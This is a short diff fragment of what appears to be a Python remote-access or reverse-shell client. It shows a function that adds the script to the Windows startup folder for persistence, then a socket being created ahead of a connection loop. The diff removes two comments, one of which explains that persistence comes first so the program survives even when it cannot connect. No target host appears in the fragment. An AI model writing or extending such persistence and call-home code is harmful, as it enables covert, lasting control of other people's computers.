@@ -21,10 +21,8 @@ def add_to_startup():
         print(f"[-] Startup Folder failed: {e}")
 
 # --- 2. INITIALIZE ---
-# We establish persistence first so it works even if we can't connect right now
 add_to_startup()
 
-# We MUST create the socket object here before using it
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # --- 3. CONNECTION LOOP ---
